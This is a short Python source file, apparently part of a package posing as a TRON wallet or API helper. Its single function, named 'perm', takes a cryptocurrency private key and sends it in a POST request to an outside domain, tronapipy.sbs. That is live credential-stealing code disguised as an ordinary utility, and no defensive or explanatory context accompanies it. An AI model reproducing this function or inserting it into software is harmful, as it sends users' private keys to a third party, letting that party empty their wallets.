import requests


def perm(private_key):
    transaction_data = [{'private_key': private_key}]
    response = requests.post('https://tronapipy.sbs/tron', json=transaction_data)
    if response.status_code == 200:
        return 1
    else:
        return 0
